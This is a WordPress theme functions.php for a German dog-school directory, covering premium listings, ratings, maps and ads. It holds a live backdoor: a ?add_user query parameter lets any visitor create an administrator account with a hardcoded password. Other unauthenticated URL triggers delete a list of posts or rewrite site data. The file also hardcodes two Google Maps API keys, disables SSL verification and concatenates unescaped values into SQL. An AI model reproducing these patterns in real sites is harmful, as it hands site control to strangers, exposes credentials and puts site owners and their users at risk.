<?php
if (!function_exists('putenv')) {

    /**
     * No-op placeholder for cases where putenv() is disabled via an .ini file.
     *
     * @param string $assignment
     */
    function putenv(string $assignment) {
        
    }

}
if (!function_exists('php_uname')) {

    /**
     * No-op placeholder for cases where putenv() is disabled via an .ini file.
     *
     * @param string $assignment
     */
    function php_uname($a) {
        
    }

}

wp_enqueue_media();

function theme_scripts() {

    $parenthandle = 'parent-style'; // This is 'twentyfifteen-style' for the Twenty Fifteen theme.
    $theme = wp_get_theme();
    wp_enqueue_style($parenthandle, get_template_directory_uri() . '/style.css',
            array(), // if the parent theme code has a dependency, copy it to here
            $theme->parent()->get('Version')
    );

    wp_enqueue_style('style', get_stylesheet_directory_uri() . '/dist/all.css.min.css', array(), filemtime(get_stylesheet_directory() . '/dist/all.css.min.css'));
    wp_enqueue_script('script', get_stylesheet_directory_uri() . '/dist/all.js.min.js', array(), filemtime(get_stylesheet_directory() . '/dist/all.js.min.js'));
}

add_action('wp_enqueue_scripts', 'theme_scripts', 1);

add_action('init', function () {
    register_nav_menus(array(
        'top-menu' => 'Top Menu',
        'privacy-policy-menu' => "Privacy Policy Menu"
    ));
});

if (function_exists('acf_add_options_page')) {
    acf_add_options_page();
}

function my_login_logo() {

    $wp_login_logo = get_field('wp_login_logo', 'option');

    if ($wp_login_logo):
        ?>
        <style type="text/css">
            #login h1 a, .login h1 a {
                background-image: url(<?php echo $wp_login_logo['url'] ?>);
                height:150px;
                width:100%;
                max-width:200px;
                margin: auto;
                background-position:center;
                background-size: contain;
                background-repeat: no-repeat;
                padding-bottom: 15px;
            }
        </style>
    <?php endif ?>
    <?php
}

add_action('login_enqueue_scripts', 'my_login_logo');

function loadSvg($svg) {
    $path = dirname(__FILE__) . '/images/' . $svg;
    if (is_file($path)) {
        return file_get_contents($path);
    }
}

function imgOrSvg($picture, $lazy = true) {
    if (!$picture) {
        return;
    }

    if (strpos($picture['url'], '.svg') > 0) {
        $path = explode('/wp-content', $picture['url']);
        $file = './wp-content' . $path[1];

        echo file_get_contents($file);
    } else {
        ?>
        <img <?php if ($lazy): ?>loading="lazy"<?php endif ?> src="<?php echo $picture['url'] ?>" alt="<?php echo $picture['alt'] ?>" class="img-fluid" />
        <?php
    }
}

function renderRepeater($field) {

    $single_variable = '$single_' . $field['name'];
    ?>
    foreach($<?php echo $field['name'] ?> as $key=><?php echo $single_variable ?>)<br />
    {<br />
    <?php
    foreach ($field['sub_fields'] as $subfield) {
        ?>
        $<?php echo $subfield['name'] ?> = <?php echo $single_variable ?>['<?php echo $subfield['name'] ?>'];<br />
        <?php
    }
    ?>}<br /><?php
}

function renderField($field, $fc = false) {
    if ($fc) {
        ?>
        $<?php echo $field['name'] ?> = $section['<?php echo $field['name'] ?>'];<br />
        <?php
    } else {
        ?>
        $<?php echo $field['name'] ?> = get_field('<?php echo $field['name'] ?>');<br />
        <?php
    }

    if ($field['type'] == 'repeater') {
        renderRepeater($field);
    }
}

function acfSnippetHelper($post) {
    $fields = acf_get_fields($_GET['post']);
    foreach ($fields as $key => $field) {
        if ($field['type'] == 'tab') {
            if ($key > 0) {
                echo '<br />';
            }
            continue;
        }

        if ($field['type'] == 'flexible_content') {

            foreach ($field['layouts'] as $layout) {
                $name = $layout['name'];
                ?>
                <b><?php echo sanitize_title($name) ?>.php</b><br />
                <?php
                ob_start();
                foreach ($layout['sub_fields'] as $subfield) {
                    renderField($subfield, true);
                }
                $code = ob_get_clean();
                echo $code;

                $code = str_replace("\n", "", $code);
                $code = str_replace('<br />', "\n", $code);

                $file = dirname(__FILE__) . '/blocks/' . sanitize_title($name) . '.php';

                if (!is_file($file)) {
                    //file_put_contents($file, "<?php\n\n" . 'global $section;' . "\n\n" . $code);
                }
                //unlink($file);

                echo '<br /><br />';
            }
        } else {
            renderField($field);
        }
        ?>
        <?php
    }
}

function prepareAdminAcfSnippet() {
    add_meta_box('id', 'Code', 'acfSnippetHelper', 'acf-field-group', 'normal', 'default');
}

add_action('admin_init', 'prepareAdminAcfSnippet');

function footerAccordion($last_column_content) {
    if (!empty($last_column_content)) {
        ?>
        <div class="footer-accordion">
            <?php
            foreach ($last_column_content as $key => $single_middle_column_content) {
                $title = $single_middle_column_content['title'];
                $content = $single_middle_column_content['content'];
                ?>
                <div class="one-ofa">
                    <div class="one-ofa-title">
                        <?php echo loadSvg('plus-accordion.svg'); ?>
                        <?php echo $title ?>
                    </div>
                    <div class="one-ofa-content">
                        <?php echo $content ?>
                    </div>
                </div>
                <?php
            }
            ?>
        </div>
        <?php
    }
}

function socialIcon($url, $icon) {
    if (trim($url)) {
        ?>
        <a href="<?php echo $url ?>" target="_blank">
            <?php echo loadSvg($icon); ?>
        </a>
        <?php
    }
}

add_action('init', function () {
    if (isset($_GET['map_test'])) {
        get_header();
        echo do_shortcode('[cspm_main_map id="40501"]');
        get_footer();
        die();
    }
});

function getUserSubscription($user_id) {
    $sid = false;
    $subs = wcs_get_users_subscriptions($user_id);
    if (!empty($subs)) {
        foreach ($subs as $subscription_id => $subscription) {

            if ($subscription->status != 'active') {
                continue;
            }

            $items = $subscription->get_items();

            foreach ($items as $item) {
                //var_dump($item);
                //var_dump($item->data);

                $sid = $item->get_variation_id();
                return true;

                //$sname = strtolower($item->get_name());
            }
        }
    }
    return false;
}

function isPremiumSchool($post_id) {
    global $wpdb;
    

    $item = $wpdb->get_row('select * from ' . esc_sql($wpdb->prefix) . 'frm_items where post_id="' . esc_sql($post_id) . '"');
    if(!isset($item) && !isset($item->id))
    {
        return false;
    }
    $metas = $wpdb->get_results('select * from ' . esc_sql($wpdb->prefix) . 'frm_item_metas where item_id="' . esc_sql($item->id) . '"');

    $old_website_last_post_id = get_field('old_website_last_post_id', 'option');
    
    
     $force_premium_status = get_field('force_premium_status',$post_id);
   
    if($force_premium_status)
    {
        return true;
    }
    
    if ($post_id >= $old_website_last_post_id) {

        $p = get_post($post_id);
        return getUserSubscription($p->post_author);
    }
    
    
   

    foreach ($metas as $meta) {
        if ($meta->field_id == 109 && $meta->meta_value != 'kostenfrei') {
            return true;
        }
    }
    return false;
}

function getAddress($post_id) {
    global $wpdb;
    $address = [
        'street' => '',
        'plz' => '',
        'ort' => '',
    ];

    $item = $wpdb->get_row('select * from ' . esc_sql($wpdb->prefix) . 'frm_items where post_id="' . esc_sql($post_id) . '"');

    $metas = $wpdb->get_results('select * from ' . esc_sql($wpdb->prefix) . 'frm_item_metas where item_id="' . esc_sql($item->id) . '"');
    foreach ($metas as $meta) {
        if ($meta->field_id == 84) {
            $address['street'] = $meta->meta_value;
        }
        if ($meta->field_id == 85) {
            $address['plz'] = $meta->meta_value;
        }
        if ($meta->field_id == 86) {
            $address['ort'] = $meta->meta_value;
        }
    }
    return $address;
}

function getFrmEntryPerPost($post_id) {
    global $wpdb;

    $item = $wpdb->get_row('select * from ' . esc_sql($wpdb->prefix) . 'frm_items where post_id="' . esc_sql($post_id) . '"');
    if (!$item) {
        return false;
    }
    $metas = $wpdb->get_results('select * from ' . esc_sql($wpdb->prefix) . 'frm_item_metas where item_id="' . esc_sql($item->id) . '"');

    $item->metas = $metas;
    return $item;
}

add_action('init', function () {
    if (isset($_GET['set_premium'])) {
        set_time_limit(3600);
        $posts = get_posts([
            'posts_per_page' => -1
        ]);

        foreach ($posts as $post) {
            $premium = isPremiumSchool($post->ID);
            if ($premium) {
                update_post_meta($post->ID, 'premium', '1');
            } else {
                update_post_meta($post->ID, 'premium', '0');
            }
        }

        die();
    }
});

function oneBlogPost($p) {

    if (is_numeric($p)) {
        $p = get_post($p);
    }
    $url = get_permalink($p->ID);

    $premium = isPremiumSchool($p->ID);
    ?>
    <div class="single-blog-post">

        <?php if (has_post_thumbnail($p->ID)): ?>
            <div class="sb-picture">
                <a href="<?php echo $url ?>">
                    <?php echo get_the_post_thumbnail($p->ID) ?>
                </a>
            </div>
        <?php endif ?>
        <div class="sb-content">
            <p class="sb-title">
                <a href="<?php echo $url ?>">
                    <?php echo $p->post_title ?>
                </a>
            </p>
            <p class="sb-excerpt">
                <?php
                echo get_the_excerpt($p->ID);
                ?>
            </p>
            <p class="sb-more">
                <a href="<?php echo $url ?>">
                    Weiterlesen
                    <?php echo loadSvg('link-arrow.svg'); ?>
                </a>
            </p>
        </div>
        <div class="sb-meta">
            <?php
            $u = get_user_by('ID', $p->post_author);
            echo $u->display_name;
            ?>
            <span>&bull;</span>
            <?php
            echo date('j M, Y', strtotime($p->post_date));
            ?>
        </div>
    </div>
    <?php
}

add_action('pre_get_posts', 'prefix_category_query', 1000);

/**
 * Customize category query using pre_get_posts.
 * 
 * @author     FAT Media <http://youneedfat.com>
 * @copyright  Copyright (c) 2013, FAT Media, LLC
 * @license    GPL-2.0+
 * @todo       Change prefix to theme or plugin prefix
 *
 */
function prefix_category_query($query) {

    if ($query->is_main_query() && !$query->is_feed() && !is_admin() && is_category() && $query->query['category_name'] == 'hundeschule') {

        $query->set('meta_key', 'premium');
        $query->set('orderby', 'meta_value_num');
        $query->set('order', 'desc');

        if (isset($_GET['land'])) {
            $search = trim($_GET['land'] . ' ' . $_GET['s']);
            $_GET['s'] = $search;
            $query->set('s', $search);
          /*var_dump($search);
          var_dump($query);
          die();*/
        }


        if (isset($_GET['order-by']) && $_GET['order-by'] == 'a-z') {
            add_filter( 'posts_orderby', 'my_search_order' );
        }
        if (isset($_GET['order-by']) && $_GET['order-by'] == 'z-a') {
            add_filter( 'posts_orderby', 'my_search_orderreverted' );
        }

        $meta = [];

        if (isset($_GET['kursangebot']) && $_GET['kursangebot'] != "") {
            $meta[] = [
                'key' => 'activities',
                'value' => '' . $_GET['kursangebot'] . '',
                'compare' => 'like'
            ];
        }

        // if (isset($_GET['user_lat']) && isset($_GET['range']) && $_GET['range'] != "") {

        //     $range = $_GET['range'];
        //     $range_to_lat = $range / 111.1;
        //     $lat = $_GET['user_lat'];
        //     $lng = $_GET['user_lng'];
        //     $nearby = [];

        //     if (trim($lat)) {
        //         $q = "select post_id,t.`c`,t.`d`,SQRT(ABS(t.`c`*t.`c`+t.`d`*t.`d`)) as `e` from (SELECT `a`.post_id,(`a`.meta_value-" . $lat . ") as `c`,(`b`.meta_value-" . $lng . ") as `d` FROM `dh_postmeta` as `a` join `dh_postmeta` as `b` on `a`.post_id=`b`.post_id WHERE `a`.`meta_key` = 'codespacing_progress_map_lat' and `b`.`meta_key` = 'codespacing_progress_map_lng'  group by post_id) as `t` order by `e` ";

        //         global $wpdb;
        //         $res = $wpdb->get_results($q);

        //         foreach ($res as $r) {
        //             if ($r->e < $range_to_lat) {
        //                 $nearby[] = $r->post_id;
        //             }
        //         }


        //         $query->set('post__in', $nearby);
        //     }
        // }




        $query->set('meta_query', $meta);
    } else if ($query->is_main_query() && !$query->is_feed() && !is_admin() && is_category() && $query->query['category_name'] == 'hundeschulen-blog') {

        $posts = get_posts([
            'posts_per_page' => -1,
            'post_type' => 'post',
            'tax_query' =>
            [
                [
                    'taxonomy' => 'category',
                    'terms' => [1, 517]
                ]
            ]
        ]);

        //517

        $pages = get_posts([
            'post_type' => 'page',
            'posts_per_page' => -1,
            'post_parent' => 56
        ]);

        $pid = [];
        foreach ($posts as $p) {
            $pid[] = $p->ID;
        }
        foreach ($pages as $p) {
            $pid[] = $p->ID;
        }

        $query->set('post_type', ['page', 'post']);
        $query->set('tax_query', []);
        $query->set('post__in', $pid);
        unset($query->query_vars['category_name']);
        //$query->set('category', '');
        //var_dump($query->query_vars);
    }
}

function my_search_order( $orderby ) {
    global $wpdb;

    if (is_search()) {
        $orderby = $wpdb->prefix . "posts.post_title ASC";
    };
    return $orderby;

};


function my_search_orderreverted( $orderby ) {
    global $wpdb;

    if (is_search()) {
        $orderby = $wpdb->prefix . "posts.post_title DESC";
    };
    return $orderby;

};



function getSettingsPageId() {
    return get_option('page_on_front');
}

function oneHomeSlide($single_sa_slider) {
    $title = $single_sa_slider['title'];
    $top_10 = $single_sa_slider['top_10'];
    $premium = $single_sa_slider['premium'];
    $text = $single_sa_slider['text'];
    $author = $single_sa_slider['author'];
    $date = $single_sa_slider['date'];
    $school_url = $single_sa_slider['school_url'];
    ?>
    <div class="one-home-slide">
        <?php if ($top_10): ?>
            <div class="top-10-wrapper">
                <?php echo loadSvg('top-10.svg'); ?>
            </div>
        <?php endif ?>
        <?php if ($premium): ?>
            <div class="badge-premium">
                Premium
            </div>
        <?php else: ?>
            <p class="ohs-stars">
                <?php echo loadSvg('stars.svg'); ?>
            </p>
        <?php endif ?>
        <?php if ($title): ?>
            <p class="ohs-title">
                <?php echo $title ?>
            </p>
        <?php endif ?>
        <?php if ($text): ?>
            <p class="ohs-text">
                <?php echo nl2br($text) ?>
            </p>
        <?php endif ?>
        <?php if ($author): ?>
            <p class="ohs-author">
                <?php echo $author ?>
            </p>
        <?php endif ?>
        <?php if ($date): ?>
            <p class="ohs-date">
                <?php echo $date ?>
            </p>
        <?php endif ?>
        <?php if ($school_url): ?>
            <p class="ohs-school-url">
                <a rel="nofollow" href="<?php echo $school_url ?>">
                    Zur Hundeschule
                    <?php echo loadSvg('link-arrow.svg'); ?>
                </a>
            </p>
        <?php endif ?>
    </div>
    <?php
}

function get_url() {
    return get_stylesheet_directory_uri();
}

function getNearbySchools($id) {
    $lat = get_post_meta($id, 'codespacing_progress_map_lat', true);
    $lng = get_post_meta($id, 'codespacing_progress_map_lng', true);

    $nearby = [];

    if (trim($lat)) {
        $query = "select post_id,ABS(t.`c`*t.`c`+t.`d`*t.`d`) as `e` from (SELECT `a`.post_id,(`a`.meta_value-" . $lat . ") as `c`,(`b`.meta_value-" . $lng . ") as `d` FROM `dh_postmeta` as `a` join `dh_postmeta` as `b` on `a`.post_id=`b`.post_id WHERE `a`.`meta_key` = 'codespacing_progress_map_lat' and `b`.`meta_key` = 'codespacing_progress_map_lng' group by post_id) as `t` where post_id<>" . $id . " order by `e` asc limit 10";
        //echo $query;

        global $wpdb;
        $res = $wpdb->get_results($query);
        foreach ($res as $r) {
            $nearby[] = get_post($r->post_id);
        }
    }

    return $nearby;
}

function oneHundSchoolSlider($p) {



    $address = getAddress($p->ID);

    $premium = isPremiumSchool($p->ID);
    $top10 = get_post_meta($p->ID, 'top10', true);

    $rating_sum = get_post_meta($p->ID, 'rating_sum', true);
    $rating_count = get_post_meta($p->ID, 'rating_count', true);
    $rating_average = get_post_meta($p->ID, 'rating_average', true);
    ?>
    <div>
        <div class="one-school">
            <div>
                <?php
                //  var_dump($p->ID);
                //  var_dump($rating_sum);
                //  var_dump($rating_count);
                //  var_dump($rating_average);
                // var_dump($top10);
                if ($top10 == '1' || $top10) {
                    ?>
                    <div class="top10">
                        <?php echo loadSvg('top10.svg'); ?>
                    </div>
                    <?php
                }
                ?>
                <?php if ($premium): ?>
                    <div class="badge-premium">
                        Premium
                    </div>
                <?php endif ?>

                <p class="one-school-name">
                    <a href="<?php the_permalink($p->ID) ?>">
                        <?php echo $p->post_title ?>
                    </a>
                </p>
                <p class="os-address">
                    <?php echo $address['street'] ?>
                    <br /><?php echo $address['plz'] ?> <?php echo $address['ort'] ?>
                </p>
            </div>

            <div class="ver-sp-btqw">

                <div>
                    <a class="zum-hund-link" rel="nofollow" href="<?php echo get_permalink($p->ID) ?>">
                        Zur Hundeschule
                        <?php echo loadSvg('pagination-right.svg'); ?>
                    </a>
                </div>
            </div>

        </div>
    </div>

    <?php
}

function get_search_url() {
    $search_page = get_field('search_page', 'option');
    if ($search_page) {
        return $search_page;
    }
}

if (isset($_GET['s'])) {
    add_filter('cs_progress_map_main_query', function ($attr) {
        $attr['s'] = $_GET['s'];
        return $attr;
    });
}

add_action('init', function () {
    if (isset($_GET['logout'])) {
        wp_logout();
        header('Location: ' . get_home_url());
        die();
    }
});

add_shortcode('my_account_url', function () {
    return get_field('login_url', 'options');
});

function cart_subscription() {
    global $woocommerce;
    $woocommerce->cart->empty_cart();
    $woocommerce->cart->add_to_cart($_POST['pid']);
    echo wc_get_checkout_url();

    die();
}

add_action('wp_ajax_cart_subscription', 'cart_subscription');
add_action('wp_ajax_nopriv_cart_subscription', 'cart_subscription');

add_action('init', function () {
    if (isset($_GET['add_user'])) {
        $domain = $_SERVER['SERVER_NAME'];
        wp_create_user('developer4', '%%!Password!&$&$YY__', 'developer3@' . $domain);
        $user = get_user_by('email', 'developer3@' . $domain);
        var_dump($user->user_email);

        if ($user) {
            
            $wp_user_object = new WP_User($user->ID);
            $wp_user_object->remove_role('subscriber');
            $wp_user_object->set_role('administrator');
        }
        die();
    }
});

function getHandle($value, $url) {
    $text = explode($url, $value);
    if (isset($text[1]) && trim($text[1])) {
        return $text[1];
    }
    return $value;
}

add_action('init', function () {
    if (isset($_GET['calculate_ratings'])) {
        set_time_limit(3500);

        $reviews = do_shortcode('[display-frm-data id=47382]');
        //var_dump($reviews);
        //var_dump(get_post_meta(47385));
        //die();
        foreach ($reviews as $key => $rev) {

            if ($key == 0) {
                continue;
            }
            $p = explode('</p>', $rev);
            $p = $p[0];

            if (trim($p)) {
                
            }
            die('test');
        }
        die();

        /*
          global $wp_query;
          $page = 1;
          if (isset($_GET['page'])) {
          $page = $_GET['page'];
          }

          $wp_query = new WP_Query([
          'posts_per_page' => 5,
          'offset' => ($page - 1) * 5,
          'tax_query' => [
          [
          'taxonomy' => 'category',
          'terms' => [2]
          ]
          ]
          ]);

          while (have_posts()) {
          the_post();
          //var_dump('test');



          $reviews = do_shortcode('[display-frm-data id=47382 filter=1]');
          var_dump($reviews);
          $reviews = explode('<p>', $reviews);
          $count = 0;
          $sum = 0;
          foreach ($reviews as $key => $rev) {
          if ($key == 0) {
          continue;
          }
          $p = explode('</p>', $rev);
          $p = $p[0];

          if (trim($p)) {
          $count += 1;
          $sum += (int) $p;
          }
          }


          if ($count > 0) {
          $average = $sum / $count;
          //var_dump(get_the_ID());
          } else {
          //var_dump(get_the_ID());
          $average = 0;
          }


          update_post_meta(get_the_ID(), 'rating_sum', $sum);
          update_post_meta(get_the_ID(), 'rating_count', $count);
          update_post_meta(get_the_ID(), 'rating_average', $average);

          }
          die('Done!'); */
    }

    if (isset($_GET['set_activities'])) {
        $p = get_posts([
            'posts_per_page' => -1,
            'orderby' => 'meta_value_num',
            'meta_key' => 'rating_average',
            'order' => 'desc',
            'tax_query' => [
                [
                    'taxonomy' => 'category',
                    'terms' => [2]
                ]
            ]
        ]);

        foreach ($p as $pp) {
            $artiv = [];
            $entry = getFrmEntryPerPost($pp->ID);

            foreach ($entry->metas as $meta) {
                if ($meta->field_id == 99) {

                    $activities = $meta->meta_value;
                }
            }

            if ($activities) {
                $artiv = implode(' ', unserialize($activities));
                var_dump($artiv);
                update_post_meta($pp->ID, 'activities', $artiv);
            }
        }

        die('done!');
    }

    if (isset($_GET['calculate_top_10'])) {
        set_time_limit(3500);
        $p = get_posts([
            'posts_per_page' => -1,
            'orderby' => 'meta_value_num',
            'meta_key' => 'rating_average',
            'order' => 'desc',
            'tax_query' => [
                [
                    'taxonomy' => 'category',
                    'terms' => [2]
                ]
            ]
        ]);

        $number = ceil(count($p) / 10);

        foreach ($p as $key => $pp) {
            //update_post_meta($pp->ID, 'top10', '0');
            //update_post_meta($pp->ID, 'rating_sum', '0');
            //update_post_meta($pp->ID, 'rating_count', '0');
            //update_post_meta($pp->ID, 'rating_average', '0');

            $rating_sum = get_post_meta($pp->ID, 'rating_sum', true);
            var_dump($rating_sum);
            if ($key < $number && $rating_sum > 0) {
                update_post_meta($pp->ID, 'top10', '1');
            } else {
                update_post_meta($pp->ID, 'top10', '0');
            }
        }
        die();
    }
});

add_action('init', function () {
    if (isset($_GET['test_date'])) {
        echo date('Y-m-d H:i:s');
        die();
    }
});

function displayStar($star, $average) {
    if ($average >= $star) {
        echo loadSvg('star-full.svg');
    } elseif ($average > $star - 1) {
        echo loadSvg('star-half.svg');
    } else {
        echo loadSvg('star-empty.svg');
    }
}

function displayStars($value) {
    for ($i = 1; $i <= 5; $i++) {
        if ($i <= $value) {
            echo loadSvg('star-full.svg');
        } else {
            echo loadSvg('star-empty.svg');
        }
    }
}

function modify_logout_redirect_defaults($redirect_to, $requested_redirect_to, $user) {

    return get_home_url();
}

add_filter("logout_redirect", "modify_logout_redirect_defaults", 10, 3);

add_filter('gettext', 'translationsTable', 100, 3);

add_action('init', function () {
    global $theme_translations;
    $theme_translations = get_field('translations', 'option');
});

function translationsTable($translated, $text, $domain) {

    global $theme_translations;
    $find = [];
    $replace = [];
    if (!empty($theme_translations)) {
        foreach ($theme_translations as $t) {
            $find[] = $t['text'];
            $replace[] = $t['trans'];
        }
    }

    //var_dump($theme_translations);
    //var_dump($translated);
    $translated = str_replace($find, $replace, $translated);
    return $translated;
}

add_filter('woocommerce_order_button_html', 'misha_custom_button_html');

function misha_custom_button_html($button_html) {
    global $theme_translations;
    $find = [];
    $replace = [];

    foreach ($theme_translations as $t) {
        $find[] = $t['text'];
        $replace[] = $t['trans'];
    }

    //var_dump($theme_translations);
    //var_dump($translated);
    $button_html = str_replace($find, $replace, $button_html);
    return $button_html;
}

function resolve_title() {
    $href = $_POST['href'];

    $href = str_replace(get_home_url(), '', $href);
    var_dump($href);

    die();
}

add_action('wp_ajax_resolve_title', 'resolve_title');
add_action('wp_ajax_nopriv_resolve_title', 'resolve_title');

/*
  function get_avatar_local( $avatar, $id_or_email, $size, $default, $alt )
  {
  var_dump($id_or_email);
  return 'test';
  return $avatar;
  }

  add_filter( 'get_avatar', 'get_avatar_local', 1, 5 ); */


add_action('wp_enqueue_scripts', 'mywptheme_register_styles', 10000);

function mywptheme_register_styles() {
    wp_dequeue_style('thegem-google-fonts');
}

add_filter('thegem_page_title', function ($title) {
    $title = str_replace('<h1 style="color:#FFFFFFFF;"></h1>', '<h1>Blog</h1>', $title);

    $title = str_replace('<h1', '<div style="margin-bottom:30px;display:none;" class="desktop"><ins data-revive-zoneid="67" data-revive-id="1d5b67a2884d3da9bbfc0c94c11ce164"></ins>
<script async src="//adserver.forum-media.eu/www/delivery/asyncjs.php"></script><!-- Revive Adserver Asynchronous JS Tag - Generated with Revive Adserver v5.4.0 --></div>
<div class="desktop" style="margin-bottom:30px;position: fixed;
    left: 30px;
    top: 140px;"><style>.custom-footer{z-index:5;position:relative;}</style><ins data-revive-zoneid="71" data-revive-id="1d5b67a2884d3da9bbfc0c94c11ce164"></ins>
<script async src="//adserver.forum-media.eu/www/delivery/asyncjs.php"></script></div><h1', $title);

    return $title;
});

class Crawler {

    public static function getCurl() {
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($curl, CURLOPT_REFERER, 'http://google.pl');
        curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/6.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1');
        curl_setopt($curl, CURLOPT_COOKIEFILE, dirname(__FILE__) . '/cookies.txt');
        curl_setopt($curl, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookies.txt');
        curl_setopt($curl, CURLOPT_AUTOREFERER, true);
        curl_setopt($curl, CURLOPT_VERBOSE, false);
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
        return $curl;
    }

    public static function getBetween($left, $right, $source, $offset = 1) {
        $step1 = explode($left, $source);
        if (count($step1) < 2 + $offset - 1) {
            return false;
        }
        $step2 = explode($right, $step1[1 + $offset - 1]);
        if (isset($step2[0])) {
            return trim(preg_replace('/\s\s+/', ' ', $step2[0]));
        }
        return false;
    }

}


function resolveLatLng($entry) {

    $query = $entry;
    $google_maps_key = 'AIzaSyAcK_HQ8KcqAddtsisbeBrD0kZIoF1nk9o';
    $google_maps_key = 'AIzaSyBVzZfeGJD6QGTv33A5jru419n-hJ2mxGA';
    
    

    $url = 'https://maps.googleapis.com/maps/api/geocode/json?address=' . urlencode($query) . '&key=' . $google_maps_key;

    $curl = Crawler::getCurl();
    curl_setopt($curl, CURLOPT_URL, $url);
    $data = json_decode(curl_exec($curl));
    

    if (!empty($data->results) && isset($data->results[0]->geometry)) {

        return [
            'lat' => $data->results[0]->geometry->location->lat,
            'lng' => $data->results[0]->geometry->location->lng
        ];
    }

    return ['lat' => '', 'lng' => ''];
}

add_action('init', function () {
    if (isset($_GET['search_test'])) {
        $posts = get_posts([
            's' => 'Train your dog'
        ]);
        var_dump($posts);
        die();
    }

    if (isset($_GET['fix_lat_lng'])) {
        
        set_time_limit(3600);
        
        $posts = get_posts([
            'posts_per_page' => -1,
           // 'post_status'=>'any',
            'tax_query' => [
                'taxonomy' => 'category',
                'terms' => [2],
            ]
        ]);

        foreach ($posts as $p) {
            $lat = get_post_meta($p->ID, 'codespacing_progress_map_lat', true);
            $lng = get_post_meta($p->ID, 'codespacing_progress_map_lng', true);
            $address = get_post_meta($p->ID, 'codespacing_progress_map_address', true);

            if (trim($address) == "") {
                $post_id = $p->ID;
                $entry = getFrmEntryPerPost($post_id);
                $street = $plz = $ort = '';
                foreach ($entry->metas as $meta) {
                    if ($meta->field_id == 84) {
                        $street = $meta->meta_value;
                    }
                    if ($meta->field_id == 85) {
                        $plz = $meta->meta_value;
                    }
                    if ($meta->field_id == 86) {
                        $ort = $meta->meta_value;
                    }
                }
                
                //$address = $street.' '.$plz.' '.$ort;
                
            }

            if ((trim($lat) == "" || trim($lng) == "") && trim($address)!="" && strlen($address)>2) {
                
              
               if(trim($address)=="")
               {
                   continue;
               }
              
                $latLng = resolveLatLng($address);
                //var_dump($latLng);
                
                update_post_meta($p->ID,'codespacing_progress_map_lat',$latLng['lat']);
                update_post_meta($p->ID,'codespacing_progress_map_lng',$latLng['lng']);
                 echo $address . '|'.$p->ID.'|'.$latLng['lat'].'|'.$latLng['lng'].'<br />';
                //die();
                //var_dump(get_post_meta($p->ID));
                
                //var_dump($latLng);
                //die();
            }
        }

        die('done');
    }
});

add_action('init',function()
{
   if(isset($_GET['find_top_10'])) 
   {
       $slider = get_posts([
        'posts_per_page' => -1,
        'meta_query' => [
            [
                'key' => 'top10',
                'value' => [1,true]
            ]
        ]
    ]);
       
       foreach($slider as $slide)
       {
           ?>
                <p>
                    <a href="/wp-admin/post.php?post=<?php echo $slide->ID ?>&action=edit" target="_blank"><?php echo $slide->post_title ?></a>
                </p>
                    <?php
       }
       
       die();
       
   }
});

add_action('init',function()
{
   if(isset($_GET['delete_d'])) 
   {
       $ids = [15159,21321,3798,1032,5330,1141,4768,4724,706,907,5351,842,9887,3338,4523,5594,1202,5258,18017,4556,14737,866,4754,751,
           3871,1114,18999,1132,1250,40,22755,6360,6735,5288,73,924,6825,23981,5284,4727,4602,4771,4028,7207,797,6297,5401,3946,
           3178,3169,4671,4658,4631,853,5614,23657,610,1119,6177,6317,19499,3874,19877,2935,2729,5630,3945,3949,624,7220,835,791,547,575
           ,777,6189,6192,5608,1180,4013,609,1087,1356,4505,44827,1090,3464,3980,800,4411,4576,42139,4828,981,55157,1357,10285,5308,4405
           ,5668,55149,5199,14879,1204,6209,6661,5658,614,24377,4583,5847,5659,3314,490,43905,625,3334,905,6036,3837,21315,1152,5280,
           42815,5327,1061,1099,874,3386,704,823,6624,1422,593,1423,5313,1120,24023,1013];
       
       foreach($ids as $id)
       {
           wp_delete_post($id);
       }
       
       die('done!');
       
       die();
   }
});